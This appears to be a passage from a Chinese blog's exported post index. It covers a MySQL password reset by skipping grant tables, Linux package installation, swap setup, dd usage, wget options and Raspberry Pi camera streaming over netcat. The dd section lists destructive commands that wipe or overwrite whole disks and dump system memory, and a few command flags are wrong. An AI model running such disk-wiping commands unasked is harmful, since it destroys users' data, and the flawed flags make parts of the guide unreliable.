mysql.user set authentication_string=password(&#39;*******&#39;) where user=&#39;*******&#39;; #修改密码成功 flush privileges; #立即生效 8、回到第一步，将密码输入跳过设置删除 找到[mysqld]这一块代码，删除第一步加入的skip-grant-tables。 9、保存后就可以输入service mysql restart重启mysql. 接着输入mysql -u root -p回车输入密码就不会在出错了。]]></content>
      <categories>
        <category>Mysql</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux经验汇总]]></title>
    <url>%2FLinux%E7%BB%8F%E9%AA%8C%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[linux安装软件和卸载的几种方法一、rpm包安装方式步骤：1、找到相应的软件包，比如soft.version.rpm，下载到本机某个目录； 2、打开一个终端，su -成root用户； 3、cd soft.version.rpm所在的目录； 4、输入rpm -ivh soft.version.rpm 详细介绍： 安装： 我只需简单的一句话，就可以说完。执行： rpm –ivh rpm的软件包名 更高级的，请见下表： rpm参数 参数说明 -i 安装软件 -t 测试安装，不是真的安装 -p 显示安装进度 -f 忽略任何错误 -U 升级安装 -v 检测套件是否正确安装 这些参数可以同时采用。更多的内容可以参考RPM的命令帮助。 卸载： 我同样只需简单的一句话，就可以说完。执行： rpm –e 软件名 不过要注意的是，后面使用的是软件名，而不是软件包名。例如，要安装software-1.2.3-1.i386.rpm这个包时，应执行： rpm –ivh software-1.2.3-1.i386.rpm 而当卸载时，则应执行： rpm –e software。另外，在Linux中还提供了象GnoRPM、kpackage等图形化的RPM工具，使得整个过程会更加简单。 二、deb包安装方式步骤：1、找到相应的软件包，比如soft.version.deb，下载到本机某个目录； 2、打开一个终端，su -成root用户； 3、cd soft.version.deb所在的目录； 4、输入dpkg -i soft.version.deb 详细介绍：这是Debian Linux提供的一个包管理器，它与RPM十分类似。但由于RPM出现得更早，所以在各种版本的Linux都常见到。而debian的包管理器dpkg则只出现在Debina Linux中，其它Linux版本一般都没有。 安装 dpkg –i deb的软件包名 如：dpkg –i software-1.2.3-1.deb 卸载 dpkg –e 软件名 如：dpkg –e software 查询：查询当前系统安装的软件包： dpkg –l ‘软件包名’ 如：dpkg –l ‘software‘ 三、tar.gz源代码包安装方式：1、找到相应的软件包，比如soft.tar.gz，下载到本机某个目录； 2、打开一个终端，su -成root用户； 3、cd soft.tar.gz所在的目录； 4、tar -xzvf soft.tar.gz //一般会生成一个soft目录 5、cd soft 6、./configure 7、make 8、make install 详细介绍：1. 安装： 整个安装过程可以分为以下几步： 1） 取得应用软件：通过下载、购买光盘的方法获得； 2）解压缩文件：一般tar包，都会再做一次压缩，如gzip、bz2等，所以你需要先解压。如果是最常见的gz格式，则可以执行：“tar –xvzf 软件包名”，就可以一步完成解压与解包工作。如果不是，则先用解压软件，再执行“tar –xvf 解压后的tar包”进行解包； 3） 阅读附带的INSTALL文件、README文件； 4） 执行“./configure”命令为编译做好准备； 5） 执行“make”命令进行软件编译； 6） 执行“make install”完成安装； 7） 执行“make clean”删除安装时产生的临时文件。 好了，到此大功告成。我们就可以运行应用程序了。但这时，有的读者就会问，我怎么执行呢？这也是一个Linux特色的问题。其实，一般来说， Linux的应用软件的可执行文件会存放在/usr/local/bin目录下！不过这并不是“放四海皆准”的真理，最可靠的还是看这个软件的 INSTALL和README文件，一般都会有说明。 2. 卸载： 通常软件的开发者很少考虑到如何卸载自己的软件，而tar又仅是完成打包的工作，所以并没有提供良好的卸载方法。 那么是不是说就不能够卸载呢！其实也不是，有两个软件能够解决这个问题，那就是Kinstall和Kife，它们是tar包安装、卸载的黄金搭档。 四、tar.bz2源代码包安装方式：1、找到相应的软件包，比如soft.tar.bz2，下载到本机某个目录； 2、打开一个终端，su -成root用户； 3、cd soft.tar.bz2所在的目录； 4、tar -xjvf soft.tar.bz2 //一般会生成一个soft目录 5、cd soft 6、./configure 7、make 8、make install 五、apt方式安装：（安装deb包）1、打开一个终端，su -成root用户； 2、apt-cache search soft 注：soft是你要找的软件的名称或相关信息 3、如果2中找到了软件soft.version，则用apt-get install soft.version命令安装软件 注：只要你可以上网，只需要用apt-cache search查找软件，用apt-get install软件详细介绍： apt-get是debian，ubuntu发行版的包管理工具，与红帽中的yum工具非常类似。 apt-get命令一般需要root权限执行，所以一般跟着sudo命令例sudo apt-get xxxx apt-get install packagename——安装一个新软件包（参见下文的aptitude） apt-get remove packagename——卸载一个已安装的软件包（保留配置文件） apt-get --purge remove packagename——卸载一个已安装的软件包（删除配置文件） dpkg --force-all --purge packagename ——有些软件很难卸载，而且还阻止了别的软件的应用，就可以用这个，不过有点冒险。 apt-get autoremove——因为apt会把已装或已卸的软件都备份在硬盘上，所以如果需要空间的话，可以让这个命令来删除你已经删掉的软件。 apt-get autoclean——定期运行这个命令来清除那些已经卸载的软件包的.deb文件。通过这种方式，可以释放大量的磁盘空间。如果需求十分迫切，可以使用apt-get clean以释放更多空间。这个命令会将已安装软件包裹的.deb文件一并删除。 apt-get clean——这个命令会把安装的软件的备份也删除，不过这样不会影响软件的使用的。 apt-get upgrade——更新所有已安装的软件包 apt-get dist-upgrade——将系统升级到新版本 apt-cache search string——在软件包列表中搜索字符串 apt-cache showpkg pkgs——显示软件包信息。 apt-cache stats——查看库里有多少软件 apt-cache dumpavail——打印可用软件包列表。 apt-cache show pkgs——显示软件包记录，类似于dpkg –print-avail。 apt-cache pkgnames——打印软件包列表中所有软件包的名称 （需要定期运行这一命令以确保您的软件包列表是最新的） 简单的说： dpkg只能安装已经下载到本地机器上的deb包. apt-get能在线下载并安装deb包,能更新系统, 且还能自动处理包与包之间的依赖问题,这个是dpkg工具所不具备的。 六、yum方式安装：(安装rpm包)rpm 是linux的一种软件包名称，以.rmp结尾，安装的时候语法为：rpm -ivh。rpm包的安装有个很大的缺点就是文件的关联性太大，有时装一个软件要安装很多其他的软件包，很麻烦。所以为此RedHat小红帽开发了yum安装方法，他可以彻底解决这个关联性的问题，很方便，只要配置两个文件即可安装，安装方法是：yum -y install 。yum并不是一中包，而是安装包的软件 简单的说： rpm 只能安装已经下载到本地机器上的rpm 包. yum能在线下载并安装rpm包,能更新系统,且还能自动处理包与包之间的依赖问题,这个是rpm 工具所不具备的。 七、bin文件安装：如果你下载到的软件名是soft.bin，一般情况下是个可执行文件，安装方法如下： 1、打开一个终端，su -成root用户； 2、chmod +x soft.bin 3、./soft.bin //运行这个命令就可以安装软件了 八、不需要安装的软件：有了些软件，比如lumaqq，是不需要安装的，自带jre解压缩后可直接运行。假设 下载的是lumaqq.tar.gz，使用方法如下： 1、打开一个终端，su -成root用户； 2、tar -xzvf lumaqq.tar.gz //这一步会生成一个叫LumaQQ的目录 3、cd LumaQQ 4、chmod +x lumaqq //设置lumaqq这个程序文件为可运行 5、此时就可以运行lumaqq了，用命令./lumaqq即可，但每次运行要输入全路径或 切换到刚才生成的LumaQQ目录里 6、为了保证不设置路径就可以用，你可以在/bin目录下建立一个lumaqq的链接， 用命令ln -s lumaqq /bin/ 即可，以后任何时候打开一个终端输入lumaqq就可以 启动QQ聊天软件了 7、 如果你要想lumaqq有个菜单项，使用菜单编辑工具，比如Alacarte Menu Editor，找到上面生成的LumaQQ目录里的lumaqq设置一个菜单项就可以了，当然你 也可以直接到 /usr/share/applications目录，按照里面其它*.desktop文件的格 式生成一个自己的desktop文件即可。 PS：软件的安装 —- Linux下软件的安装主要有两种不同的形式。第一种安装文件名为filename.tar.gz。另一种安装文件名为 filename.i386.rpm。以第一种方式发行的软件多为以源码形式发送的。第二种方式则是直接以二进制形式发行的。i386即表示该软件是按 Inter 386指令集编译生成的。 —- 对于第一种，安装方法如下： —- 首先，将安装文件拷贝至你的目录中。例如，如果你是以root身份登录上的，就将软件拷贝至/root中。 —- #cp filename.tar.gz /root —- 由于该文件是被压缩并打包的，所以，应对其解压缩。命令为： —- #tar xvzf filename.tar.gz —- 执行该命令后，安装文件按路径，解压缩在当前目录下。用ls命令可以看到解压缩后的文件。通常在解压缩后产生的文件中，有名为”INSTALL”的文件。该文件为纯文本文件，详细讲述了该软件包的安装方法。 —- 对于多数需要编译的软件，其安装的方法大体相同。执行解压缩后产生的一个名为configure的可执行脚本程序。它是用于检查系统是否有编译时所需的库，以及库的版本是否满足编译的需要等安装所需要的系统信息。为随后的编译工作做准备。命令为： —- #./configure —- 如果检查过程中，发现有错误，configure将给予提示，并停止检查。你可以跟据提示对系统进行配置。再重新执行该程序。检查通过后，将生成用于编译 的MakeFile文件。此时，可以开始进行编译了。编译的过程视软件的规模和计算机的性能的不同，所耗费的时间也不同。命令为： —- #make —- 成功编译后，键入如下的命令开始安装： —- #make install —- 安装完毕，应清除编译过程中产生的临时文件和配置过程中产生的文件。键入如下命令： #make clean #make distclean 至此，软件的安装结束。 —- 对于第二种，其安装方法要简单的多。 —- 同第一种方式一样，将安装文件拷贝至你的目录中。然后使用rpm来安装该文件。命令如下： —- #rpm -i filename.i386.rpm —- rpm将自动将安装文件解包，并将软件安装到缺省的目录下。并将软件的安装信息注册到rpm的数据库中。参数i的作用是使rpm进入安装模式。 —- 另外，还有一些Linux平台下的商业软件。在其安装文件中，有Setup安装程序，其安装方法同Windows平台下的一样。如:Corel WordPerfect。 软件的卸载 —- 软件的卸载主要是使用rpm来进行的。卸载软件首先要知道软件包在系统中注册的名称。键入命令： —- #rpm -q -a —- 即可查询到当前系统中安装的所有的软件包。参数q的作用是使rpm进入查询命令模式。参数a是查询模式的子参数，意为全部（ALL）。查询到的信息较多，可使用less人屏显示。 —- 确定了要卸载的软件的名称，就可以开始实际卸载该软件了。键入命令： —- #rpm -e [package name] —- 即可卸载软件。参数e的作用是使rpm进入卸载模式。对名为[package name]的软件包进行卸载。由于系统中各个软件包之间相互有依赖关系。如果因存在依赖关系而不能卸载，rpm将给予提示并停止卸载。你可以使用如下的命 令来忽略依赖关系，直接开始卸载： —- #rpm -e [package name] -nodeps —- 忽略依赖关系的卸载可能会导致系统中其它的一此软件无法使用。你可以使用 —- #rpm -e [package name] -test —- 使rpm进行一次卸载预演，而不是真正卸载。这样可以使你检查一下软件是否存在有依赖关系。卸载过程中是否有错误。 交换分区的启用编译安装过程，执行make命令时报错：1234567c++: internal compiler error: Killed (program cc1plus) Please submit a full bug report, with preprocessed source if appropriate. See http://bugzilla.redhat.com/bugzilla for instructions. make[2]: * [sql/CMakeFiles/sql.dir/item_geofunc.cc.o] Error 4 make[1]: * [sql/CMakeFiles/sql.dir/all] Error 2 make: * [all] Error 2 原因解析：内存不足，mysql5.9以上的版本，编译安装需要1G内存，而我的云主机刚好1G内存。 解决方案内存不足当然加内存,加内存太贵？那就把硬盘当内存来用把1234$dd if=/dev/zero of=/data/swap_add bs=1M count=2048$mkswap /data/swap_add$swapon /data/swap_add$swapon -s 内存不足出错 解决方法：增加swap space 交换空间 1、创建空文件 /media/swapfile.img只是一个实例文件，这个文件你可以自定义创建任意一个空白文件 dd if=/dev/zero of=/media/swapfile.img bs=1024 count=1M 2、生成文件交换系统 mkswap /media/swapfile.img3、设置开机启动12345# Add this line to /etc/fstabvim /etc/fstab//加入/media/swapfile.img swap swap sw 0 0 4、激活 swapon /media/swapfile.img5、验证是否成功 [root@izwz956snfyrvah6yq8sa4z ~]# cat /proc/swaps12Filename Type Size Used Priority/media/swapfile.img file 1048572 0 -2 [root@izwz956snfyrvah6yq8sa4z ~]# grep &#39;Swap&#39; /proc/meminfo123SwapCached: 0 kBSwapTotal: 1048572 kBSwapFree: 1048572 kB Linux上创建SWAP文件/分区 :参考 dd命令解释123456789101112131415161718192021221.if=文件名：输入文件名，缺省为标准输入。即指定源文件。&lt;if=inputfile&gt;2.of=文件名：输出文件名，缺省为标准输出。即指定目的文件。&lt; of=output file &gt;3.ibs=bytes：一次读入bytes个字节，即指定一个块大小为bytes个字节。obs=bytes：一次输出bytes个字节，即指定一个块大小为bytes个字节。bs=bytes：同时设置读入/输出的块大小为bytes个字节。4.cbs=bytes：一次转换bytes个字节，即指定转换缓冲区大小。5.skip=blocks：从输入文件开头跳过blocks个块后再开始复制。6.seek=blocks：从输出文件开头跳过blocks个块后再开始复制。注意：通常只用当输出文件是磁盘或磁带时才有效，即备份到磁盘或磁带时才有效。7.count=blocks：仅拷贝blocks个块，块大小等于ibs指定的字节数。8.conv=conversion：用指定的参数转换文件。ascii：转换ebcdic为asciiebcdic：转换ascii为ebcdicibm：转换ascii为alternateebcdicblock：把每一行转换为长度为cbs，不足部分用空格填充unblock：使每一行的长度都为cbs，不足部分用空格填充lcase：把大写字符转换为小写字符ucase：把小写字符转换为大写字符swab：交换输入的每对字节noerror：出错时不停止notrunc：不截短输出文件sync：将每个输入块填充到ibs个字节，不足部分用空（NUL）字符补齐。 1.将本地的/dev/hdb整盘备份到/dev/hdddd if=/dev/hdb of=/dev/hdd2.将/dev/hdb全盘数据备份到指定路径的image文件dd if=/dev/hdb of=/root/image3.将备份文件恢复到指定盘dd if=/root/image of=/dev/hdb4.备份/dev/hdb全盘数据，并利用gzip工具进行压缩，保存到指定路径dd if=/dev/hdb | gzip &gt; /root/image.gz5.将压缩的备份文件恢复到指定盘gzip -dc /root/image.gz | dd of=/dev/hdb6.备份磁盘开始的512个字节大小的MBR信息到指定文件dd if=/dev/hda of=/root/image count=1 bs=512count=1指仅拷贝一个块；bs=512指块大小为512个字节。恢复：dd if=/root/image of=/dev/hda7.备份软盘dd if=/dev/fd0 of=disk.img count=1 bs=1440k(即块大小为1.44M)8.拷贝内存内容到硬盘dd if=/dev/mem of=/root/mem.bin bs=1024(指定块大小为1k)9.拷贝光盘内容到指定文件夹，并保存为cd.iso文件dd if=/dev/cdrom(hdc) of=/root/cd.iso10.增加swap分区文件大小第一步：创建一个大小为256M的文件：dd if=/dev/zero of=/swapfile bs=1024 count=262144第二步：把这个文件变成swap文件：mkswap /swapfile第三步：启用这个swap文件：swapon /swapfile第四步：编辑/etc/fstab文件，使在每次开机时自动加载swap文件：/swapfile swap swap defaults 0 011.销毁磁盘数据dd if=/dev/urandom of=/dev/hda1注意：利用随机的数据填充硬盘，在某些必要的场合可以用来销毁数据。12.测试硬盘的读写速度dd if=/dev/zero bs=1024 count=1000000 of=/root/1Gb.filedd if=/root/1Gb.file bs=64k | dd of=/dev/null通过以上两个命令输出的命令执行时间，可以计算出硬盘的读、写速度。13.确定硬盘的最佳块大小：1234dd if=/dev/zero bs=1024 count=1000000 of=/root/1Gb.filedd if=/dev/zero bs=2048 count=500000 of=/root/1Gb.filedd if=/dev/zero bs=4096 count=250000 of=/root/1Gb.filedd if=/dev/zero bs=8192 count=125000 of=/root/1Gb.file 通过比较以上命令输出中所显示的命令执行时间，即可确定系统最佳的块大小。14.修复硬盘dd if=/dev/sda of=/dev/sda当硬盘较长时间（比如1，2年）放置不使用后，磁盘上会产生magnetic fluxpoint。当磁头读到这些区域时会遇到困难，并可能导致I/O错误。当这种情况影响到硬盘的第一个扇区时，可能导致硬盘报废。上边的命令有可能使这些数据起死回生。且这个过程是安全，高效的。15.dd命令做usb启动盘dd if=xxx.iso of=/dev/sdb bs=1Mroot用户或者sudo，用以上命令前必须卸载u盘,sdb是你的u盘,bs=1M是块的大小,后面的数值大,写的速度相对快一点,但也不是无限的,我一般选2M,注意,执行命令后很快完成,但u盘还在闪,等不闪了,安全移除。 Linux系统 cmake2.8升级到cmake-3.9.2版本1、查看当前版本 cmake --version 2、下载获得cmake-3.9.2源码 wget https://cmake.org/files/v3.9/cmake-3.9.2.tar.gz 3、解压、安装新版本 tar -xvf cmake-3.9.2.tar.gz cd cmake-3.9.2 ./configure sudo make &amp;&amp; make install 【注】安装完后，执行cmake –version会报如下错误12345CMake Error: Could not find CMAKE_ROOT !!!CMake has most likely not been installed correctly.Modules directory not found in/Applications/CMake 2.8-11.app/Contents/binCMake Error: Error executing cmake::LoadCache(). Aborting. 【解决方法】 先执行：hash -r 然后再执行：cmake --version 完美解决 已安装成功一个包,import时依然提示ImportError: No module named 该包又经查询，怀疑可能是pip安装的python版本与当前版本不匹配1234pip -Vpip3 -Vpython2 -Vpython3 -V 创建python3连接符123ln -s /bin/python3.6 /bin/python3/bin/python3.6 路径 创建pip3链接符123ln -s /bin/pip3.6 /bin/pip3/bin/pip3.6 路径 Linux下文件编码批量转换UTF-8命令Linux命令 enca 查看文件的编码(好用 首推)一、源码包1http://dl.cihar.com/enca/ 二、使用方法1234567enca -L zh_CN file 检查文件的编码 enca -L zh_CN -x UTF-8 file 将文件编码转换为&quot;UTF-8&quot;编码 enca -L zh_CN -x utf-8 * 把文件夹下的所有文件转换为utf8编码``` 三、批量转换目录转换报错不影响 find | grep -v ‘.svn’ | xargs enca -L zh_CN -x UTF-8123456#### 字符编码转换 iconv命令语法`iconv -f encoding [-t encoding] [inputfile]... ` 选项-f encoding :把字符从encoding编码开始转换。-t encoding :把字符转换到encoding编码。-l :列出已知的编码字符集合-o file :指定输出文件-c :忽略输出的非法字符-s :禁止警告信息，但不是错误信息–verbose :显示进度信息-f和-t所能指定的合法字符在-l选项的命令里面都列出来了。1234567891011实例列出当前支持的字符编码： `iconv -l `将文件file1转码，转后文件输出到fil2中：`iconv file1 -f EUC-JP-MS -t UTF-8 -o file2`这里，没-o那么会输出到标准输出。##### 在Linux下将整个目录的文件转换字符编码的脚本 ‘#’ !/bin/shfor srcfile in *.gbk;do dstfile=${srcfile/.gbk/} if [ “$srcfile” -nt “$dstfile” ]; then echo convert $srcfile to $dstfile … iconv -f gbk -t utf8 $srcfile &gt;$dstfile fidone123456#### linux文件名编码转换工具convmv(文件名而已)convmv能帮助我们很容易地对一个文件，一个目录下所有文件进行编码转换，比如gbk转为utf8等。语法：`convmv [options] FILE(S) … DIRECTORY(S)` 主要选项：1、-f ENCODING指定目前文件名的编码，如-f gbk2、-t ENCODING指定将要转换成的编码，如-t utf-83、-r递归转换目录下所有文件名4、–list列出所有支持的编码5、–notest默认是只打印转换后的效果，加这个选项才真正执行转换操作。更多选项请man convmv。12例子：递归转换centos目录下的目前文件名编码gbk为utf-8: convmv -f gbk -t utf-8 –notest -r centos123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566### pkg-config 详解pkg-config是一个linux下的命令，用于获得某一个库/模块的所有编译相关的信息。 [pkg-config 详解(CSDN)](https://blog.csdn.net/newchenxf/article/details/51750239)### 使用 sudo apt-get install 命令安装软件的目录在哪？bin文件路径： /usr/bin 库文件路径： /usr/lib/ 其它的图标啊什么的路径： /usr/share 配置文件路径： /etc/### Wget 命令详解[原文档](https://www.gnu.org/software/wget/manual/wget.html)```Wget主要用于下载文件，在安装软件时会经常用到，以下对wget做简单说明。1、下载单个文件：wget http://www.baidu.com。命令会直接在当前目录下载一个index.html的文件2、将下载的文件存放到指定的文件夹下，同时重命名下载的文件，利用-O：wget -O /home/index http://www.baidu.com3、下载多个文件：首先，创建一个file.txt文件，写入两个url（换行），如http://www.baidu.com;然后，wget -i file.txt;命令执行后会下载两个两个文件。4、下载时，不显示详细信息，即在后台下载：wget -b http://www.baidu.com。命令执行后会，下载的详细信息不会显示在终端，会在当前目录下生成一个web-log记录下载的详细信息。5、下载时，不显示详细信息，同时将下载信息保存到执行的文件中（同4）：wget -o dw.txt http://www.baidu.com6、断点续传：wget -c http://www.baidu.com7、限制下载的的速度：wget --limit-rate=100k -O zfj.html http://www.baidu.com8、测试是否能正常访问：wget --spider http://www.baidu.com9、设置下载重试的次数：wget --tries=3 http://www.baidu.com10、下载一个完整的网站，即当前页面所依赖的所有文件：wget --mirror -p --convert-links -P./test http://localhost --mirror:打开镜像选项 -p:下载所有用于显示给定网址所必须的文件 --convert-links：下载以后，转换链接用于本地显示 -P LOCAL_DIR：保存所有的文件或目录到指定的目录下11、下载的过程中拒绝下载指定类型的文件:wget --reject=png --mirror -p --convert-links -P./test http://localhost12、多文件下载中拒绝下载超过设置大小的文件：wget -Q5m -i file.txt 注意：此选项只能在下载多个文件时有用，当你下载一个文件时没用。13、从指定网站中下载所有指定类型的文件：wget -r -A .png http://www.baidu.com14、wget下载时，某些资源必须使用--no-check-certificate http://www.baidu.com15、使用wget实现FTP下载：wget --file-user=USERNAME --file-password=PASSWORD url16、伪装代理名称下载 有些网站能通过根据判断代理名称不是浏览器而拒绝你的下载请求。不过你可以通过–user-agent参数伪装。 wget –user-agent=”Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16″ 下载链接]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树莓派填坑系列]]></title>
    <url>%2F%E6%A0%91%E8%8E%93%E6%B4%BE%E5%A1%AB%E5%9D%91%E7%B3%BB%E5%88%97%2F</url>
    <content type="text"><![CDATA[博客资料创客百科推荐极客先锋OpenCV 开发笔记博文导航物联网 IoT 经验分享小站树莓派开发笔记SPtuan的个人实验地 工具Pi Dashboard (Pi 仪表盘) github项目库 参考项目 趣无尽 自动灌溉系统用本地网络控制的树莓派摄影云台 Github：https://github.com/Mjrovai/WebCam-Pan-Tilt-Control-via-Flask基于PHP探针和Python爬虫的服务器监控Python SQLite插入温度记录 树莓派+Arduino+TensorFlow搭建图像识别小车 :TensorFlow；模型训练使用树莓派构建一个婴儿监视器 :原文参考 英文用树莓派实现实时的人脸检测 :项目地址在树莓派上实现人脸识别 :参考链接 英文圣诞老人检测机：基于树莓派和 Keras 的深度学习 AI :原文参考 英文使用树莓派进行简易人脸识别 : blog + 课程报告叮当：一个开源的树莓派中文智能音箱项目 密码123456piraspberry 改密码： sudo passwd pi #修改 Pi 密码 sudo passwd root #设置 root 密码 su root #切换到 root 用户 su pi #切换到 pi 用户 树莓派换源 清华大学开源软件镜像站 使用管理员权限（经由sudo），编辑/etc/apt/sources.list文件。参考命令行为： $ sudo nano /etc/apt/sources.list 用#注释掉原文件内容，用以下内容取代： deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main contrib non-free rpi deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main contrib non-free rpi 使用管理员权限（经由sudo），编辑/etc/apt/sources.list.d/raspi.list文件。参考命令行为： $ sudo nano /etc/apt/sources.list.d/raspi.list 用#注释掉原文件内容，用以下内容取代： deb http://mirror.tuna.tsinghua.edu.cn/raspberrypi/ stretch main ui deb-src http://mirror.tuna.tsinghua.edu.cn/raspberrypi/ stretch main ui 注意： 网址末尾的raspbian重复两次是必须的。因为Raspbian的仓库中除了APT软件源还包含其他代码。APT软件源不在仓库的根目录，而在raspbian/子目录下。 编辑镜像站后，请使用sudo apt-get update命令，更新软件源列表，同时检查您的编辑是否正确。 摄像头安装 RPi固件和raspi-config已经为了摄像头更新，请执行一次apt-get update; apt-get upgrade; raspi-config中选择camera，启动RPi固件中的摄像头驱动，然后重启 使用命令行程序raspivid和raspistill操作摄像头，捕捉视频片段或图像 捕捉到的视频片段需要用mplayer播放 参考教程1 拍照$ raspistill -o 1.jpg -t 2000 这句命令将在 2000ms 后拍摄一张照片，然后保存为 1.jpg。 raspiyuv 工具用法差不多，只不过拍摄得到的是一张未处理过的raw图像。 通过摄像头模块拍视频 想要用摄像头模块拍一段视频的话，可以从命令行运行 raspivid 工具。下面这句命令会按照默认配置(长度5秒，分辨率1920x1080，比特率 17Mbps)拍摄一段视频。 $ raspivid -o ex.h264 如果你想改变拍摄时长，只要通过 “-t” 选项来设置你想要的长度就行了（单位是毫秒）。 $ raspivid -o ex.h264 -t 10000 使用 “-w” 和 “-h” 选项将分辨率降为 1280x720… $ raspivid -o ex.h264 -t 10000 -w 1280 -h 720 raspivid 的输出是一段未压缩的 H.264 视频流，而且这段视频不含声音。为了能被通常的视频播放器所播放，这个 raw 的 H.264 视频还需要转换。可以使用 gpac 包中所带有的 MP4Box 应用。 在 Raspbian 上安装 gpac，输入命令： $ sudo apt-get install -y gpac 然后将这段 raw 的 H.264 格式的视频流转换为每秒30帧的 .mp4 格式视频： $ MP4Box -fps 30 -add keychain.h264 keychain.mp4 视频长度为10秒，使用默认分辨率以及比特率。下面是一段通过 Pi Camera 拍摄的一段实例视频。 ### 如何将摄像头的数据通过网络直播播发出去： 通过nc命令（ncat - Concatenate and redirect sockets）将摄像头的输入数据，直接重定向到网络端口实现输出. How to stream video from the Raspberry Pi camera over a network To view the feed on Linux Install the dependencies by running the following in a terminal: sudo apt-get install mplayer netcat Find your IP address by running ifconfig. (Your IP address will be listed in the console output and will probably be of the form 192.168.1.XXX). Run the following command in a terminal to view the feed using MPlayer: nc -l -p 5001 mplayer -fps 31 -cache 1024 - To view the feed on Windows Install and run Linux instead. Find your IP address by running ipconfig. (Your IP address will be listed in the console output and will probably be of the form 192.168.1.XXX). Download MPlayer. Download Netcat. Note that your browser may complain that these files are malicious, as they are unsigned executables. Press the Windows key and the ‘r’ key simultaneously to bring up the “Run” dialog. Enter cmd.exe into the dialog and press enter/return to open a DOS prompt. Enter the following command at the prompt to view the feed using MPlayer: [Path to nc.exe]\nc.exe -L -p 5001 [Path to mplayer.exe]\mplayer.exe -fps 31 -cache 1024 - To view the feed on OS X Download MPlayer. Alternatively, you can download mplayer using Brew, which we recommend. Find your IP address by running ifconfig. (Your IP address will be listed in the console output and will probably be of the form 192.168.1.XXX). Run the following command in Terminal to view the feed using MPlayer: nc -l -p 5001 mplayer -fps 31 -cache 1024 - To view the feed on a Raspberry Pi: Find your IP address by running ifconfig. (Your IP address will be listed in the console output and will probably be of the form 192.168.1.XXX). Run the following commands in a terminal on the receiving Pi: mkfifo buffer nc -p 5001 -l > buffer /opt/vc/src/hello_pi/hello_video/hello_video.bin buffer To transmit the feed from the Pi with camera module attached After setting up the “receiving” machine as per the instructions above, run the following commands in a terminal on the “transmitting” Pi: raspivid -t 999999 -o – nc [insert the IP address of the client] 5001 You can then use the commands listed in the “How to use the Raspberry Pi camera software” section above to change the capture time or to add a video effect. raspberryPi摄像头命令行软件raspistill帮助文档树莓派摄像头模块应用程序文档翻译[转]英文项目Github地址 常用命令 常用命令： # 两秒钟（时间单位为毫秒）延迟后拍摄一张照片，并保存为 image.jpg raspistill -t 2000 -o image.jpg # 拍摄一张自定义大小的照片。 raspistill -t 2000 -o image.jpg -w 640 -h 480 # 降低图像质量，减小文件尺寸 raspistill -t 2000 -o image.jpg -q 5 # 强制使预览窗口出现在坐标为 100,100 的位置，并且尺寸为宽 300 和高 200 像素。 raspistill -t 2000 -o image.jpg -p 100,100,300,200 # 禁用预览窗口 raspistill -t 2000 -o image.jpg -n # 将图像保存为 PNG 文件（无损压缩格式，但是要比 JPEG 速度慢）。注意，当选择图像编码时，文件扩展名将被忽略。 raspistill -t 2000 -o image.png –e png # 向 JPEG 文件中添加一些 EXIF 信息。该命令将会把作者名称标签设置为 Dreamcolor，GPS 海拔高度为 123.5米。 raspistill -t 2000 -o image.jpg -x IFD0.Artist=Dreamcolor -x GPS.GPSAltitude=1235/10 # 设置浮雕风格图像特效 raspistill -t 2000 -o image.jpg -ifx emboss # 设置 YUV 图像的 U 和 V 通道为指定的值（128:128 为黑白图像） raspistill -t 2000 -o image.jpg -cfx 128:128 # 仅显示两秒钟预览图像，而不对图像进行保存。 raspistill -t 2000 # 间隔获取图片，在 10 分钟（10 分钟 = 600000 毫秒）的时间里，每 10 秒获取一张，并且命名为 image_number_1_today.jpg，image_number_2_today.jpg... 的形式。 raspistill -t 600000 -tl 10000 -o image_num_%d_today.jpg # 获取一张照片并发送至标准输出设备 raspistill -t 2000 -o - # 获取一张照片并保存为一个文件 raspistill -t 2000 -o - > my_file.jpg 图像参数与命令 -?, --help : 帮助文档 -w, --width : 设置图像宽度 -h, --height : 设置图像高度 -q, --quality : 设置jpeg品质 -r, --raw : 增加raw原始拜尔数据到JPEG元数据 -o, --output : 输出文件名 ，如果要写到stdout，使用`-o -`，如果不特别指定，图像文件不会被保存 -l, --latest : 链接最近的完整图像到指定文件 -v, --verbose : 在运行摄像头时输出详细信息 -t, --timeout : 拍照和关闭时的延时指定，未指定时默认是5s -th, --thumb : 设置预览图（小图）参数（包括X、Y、品质）或者不设置 -d, --demo : 运行一个demo模式（cycle through range of camera options, no capture），括号里的我可以理解成循环测试模式吗？ -e, --encoding : 编码来输出指定格式文件 （jpg, bmp, gif, png） -x, --exif :将可交换图像文件应用到捕获中（格式：`key=value`）或者不设置 -tl, --timelapse : 间隔拍摄，每拍摄一张图片 -fp, --fullpreview : 用静态捕捉分辨率运行预览（可能会减小预览帧率） -k, --keypress : 按键触发，按`ENTER`键拍照，按`X`然后`ENTER`键退出 -s, -signal : 信号触发，等待另一个进程信号来拍摄一张照片 -g, -gl : 绘制预览到文本，而不是使用视频渲染组件（啥意思？） -gc, --glcapture : 捕获GL帧buffer而不是摄像机图像 -set, --settings : 检索摄像机设置值然后写出到stdout -cs, --camselect : 选择摄像头设备 ，默认0 -bm, --burst : 运行burst capture mode -sh, --sharpness : 设置图像锐度 （-100 到 100） -co, --contrast : 设置图像对比度 （-100 到 100） -br, --brightness : 设置图像亮度 （0 到 100） -sa, --saturation : 设置图像饱和度 （-100 到 100） -ISO, --ISO : 设置摄像头感光度 -vs, --vstab : Turn on video stabilisation 开启摄像头防抖模式（是这个意思吗？） -ev, --ev : 设置EV补偿 -ex, --exposure : 设置曝光模式（参见提示） -awb, --awb : 设置AWB模式（参见提示） -ifx, --imxfx : 设置图像效应（参见提示） -cfx, --colfx : 设置色彩效应（参见提示） -mm, --metering : 设置测光模式（参见提示） -rot, --rotation : 设置图像旋转 （0到359） -hf, --hflip : 设置水平翻转 horizontal flip -vf, --vflip : 设置垂直翻转 vertical flip -roi, --roi : 设置interest区域 （啥叫interset?） --ss, --shutter : 设置快门速度，微秒 --awbg, 